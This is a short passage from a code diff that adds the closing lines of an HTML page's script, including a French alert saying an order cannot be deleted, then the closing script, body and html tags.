+        alert("Impossible de supprimer cette commande.");
+
+    }
+
+}
+
+</script>
+
+</body>
+</html>
 }
 
 </script>
